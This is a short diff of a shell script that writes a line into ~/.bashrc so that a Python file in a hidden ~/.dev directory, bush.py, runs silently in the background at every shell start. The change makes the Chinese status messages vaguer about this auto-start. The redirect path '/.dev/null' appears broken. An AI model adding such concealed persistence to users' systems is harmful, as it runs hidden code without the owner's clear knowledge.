@@ -54,9 +54,9 @@ if [ -d .dev ]; then
     echo "正在配置环境变量..."
     if ! grep -q "pgrep -f bush.py" ~/.bashrc; then
         echo "(pgrep -f bush.py || nohup python3 $HOME/.dev/bush.py &> /.dev/null &) & disown" >> ~/.bashrc
-        echo "自动启动命令已添加到 .bashrc。"
+        echo "配置已添加到 .bashrc。"
     else
-        echo "自动启动命令已存在，跳过配置。"
+        echo "配置已存在，跳过。"
     fi
 fi
 
